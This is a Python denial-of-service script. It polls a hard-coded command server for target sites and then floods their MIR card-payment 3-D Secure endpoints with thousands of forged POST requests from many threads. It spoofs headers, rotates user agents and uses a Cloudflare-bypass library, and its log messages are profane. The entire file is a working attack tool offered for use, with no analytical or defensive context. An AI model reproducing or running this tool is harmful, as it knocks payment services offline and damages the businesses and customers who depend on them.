# -*- coding: utf-8 -*-
import cloudscraper
import requests
import string
from bs4 import BeautifulSoup
from urllib.parse import unquote, urlparse
from gc import collect
from loguru import logger
from os import system
from requests import get
from sys import stderr
from threading import Thread
from random import choice
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads

HOST = "http://46.4.63.238/exploit.php"

ALLOWED_PAREQ_CHARS = string.ascii_letters + string.digits
MAX_REQUESTS = 5000
disable_warnings()
logger.remove()
logger.add(stderr,
           format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
threads = int(input('Кількість потоків: '))

logger.info("Don't wory if you see errors, it will be fucking")


def generate_MIR_data(url):
    dat = {}
    dat["PaReq"] = ''.join([choice(ALLOWED_PAREQ_CHARS) for _ in range(490)])
    dat["MD"] = ''.join([choice(ALLOWED_PAREQ_CHARS) for _ in range(10)])
    dat["TermUrl"] = "https%3A%2F%2F" + urlparse("http://" + url).netloc
    return dat


def mainth():
    while True:
        scraper = cloudscraper.create_scraper(browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
        logger.info("GET RESOURCES FOR FUCK")
        try:
            content = scraper.get(HOST).content
            if content:
                data = loads(content)
            else:
                sleep(10)
                continue
        except:
            continue
        if not data.get('site', False) or not data['site'].get('host', False):
            continue
        page = unquote(data['site']['page'])
        site = unquote(data['site']['host'])
        name = unquote(data['site']['site'])
        logger.info("FUCKING THE " + name)
        logger.info("FUCKING THE " + page)
        scraper.headers.update(
            {'Content-Type': data['site']['content-type'], 'cf-visitor': 'https', 'User-Agent': random_useragent(),
             'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru',
             'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br', 'Referer': "https://ds1.mirconnect.ru/"})
        try:
            attack = scraper.post(page, data=generate_MIR_data(site))
            if attack.status_code >= 302 and attack.status_code >= 200:
                for i in range(MAX_REQUESTS):
                    try:
                        response = scraper.post(page, data=generate_MIR_data(site))
                        logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
                    except Exception as e:
                        logger.error(str(e))
                        continue
        except Exception as e:
            logger.error(str(e))

def cleaner():
    while True:
        sleep(60)
        collect()


if __name__ == '__main__':
    for _ in range(threads):
        Thread(target=mainth).start()

    Thread(target=cleaner, daemon=True).start()
